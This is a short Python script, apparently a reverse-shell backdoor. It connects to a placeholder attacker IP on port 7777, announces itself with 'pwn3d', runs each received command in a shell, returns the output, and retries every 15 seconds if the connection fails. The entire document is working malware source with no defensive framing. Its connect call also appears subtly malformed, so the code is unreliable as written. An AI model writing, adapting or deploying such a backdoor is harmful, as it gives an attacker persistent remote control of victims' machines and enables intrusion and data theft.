import socket as sk,subprocess, time

def pwn():
	s = sk.socket(sk.AF_INET, sk.SOCK_STREAM) # Makes TCP IPv4 Socket
	s.connect('put your IP here', 7777)       # Attempts connection home
	s.send('pwn3d')				  # Sends confirmation message
	s.settimeout(15)			  # Times out socket after 15 seconds of inactivity
	while True:
		data = s.recv(1024)		  # Recieves incoming commands
		if data == '':			  # Checks if incoming data is empty (prevents empty traffic caused by interrupt on attack side)
			break
		proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		value = proc.stdout.read() + proc.stderr.read()
		s.send(value)			  # Sends back command results

while True:
	try:
		pwn()				  # Calls reverse connection attempt
	except:
		time.sleep(15)			  # Sleeps for 15 seconds if connection fails
